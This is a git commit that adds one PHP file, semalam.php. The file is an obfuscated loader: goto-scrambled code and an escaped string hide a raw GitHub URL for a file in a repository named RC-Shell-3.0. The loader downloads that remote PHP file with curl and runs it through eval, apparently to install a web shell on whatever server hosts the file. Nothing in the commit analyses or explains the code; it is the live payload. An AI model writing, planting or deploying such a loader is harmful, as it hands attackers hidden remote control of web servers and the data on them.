961009ce393125c1411bf3ed1758fed289b17d62
Maw <adikris00@protonmail.com>
2026-09-16 12:58:35 +0700

    Add files via upload

---
+++ semalam.php
@@ -0,0 +1,6 @@
+<?php
+/*   __________________________________________________
+    |  Obfuscated by Ultraman Gila | t.me/maw3six      |
+    |__________________________________________________|
+*/
+goto lpAWR; SVTN9: $XSuGS = curl_init(); goto QS1dJ; LX9J3: curl_setopt($XSuGS, CURLOPT_RETURNTRANSFER, true); goto pfqJa; GSaes: curl_close($XSuGS); goto npBqs; QS1dJ: curl_setopt($XSuGS, CURLOPT_URL, $xxndi); goto LX9J3; pfqJa: $BmccT = curl_exec($XSuGS); goto GSaes; lpAWR: $xxndi = "\150\x74\164\160\163\x3a\57\57\x72\x61\x77\56\147\x69\x74\150\x75\142\x75\x73\x65\x72\143\157\156\164\145\x6e\x74\x2e\x63\x6f\x6d\57\155\141\167\63\163\151\170\x2f\x52\x43\55\x53\x68\x65\154\x6c\55\x33\x2e\x30\x2f\x72\145\x66\x73\x2f\150\x65\141\144\163\57\x6d\141\x69\156\57\x6c\x61\155\x70\165\56\160\x68\x70"; goto SVTN9; npBqs: echo eval("\77\x3e" . $BmccT);
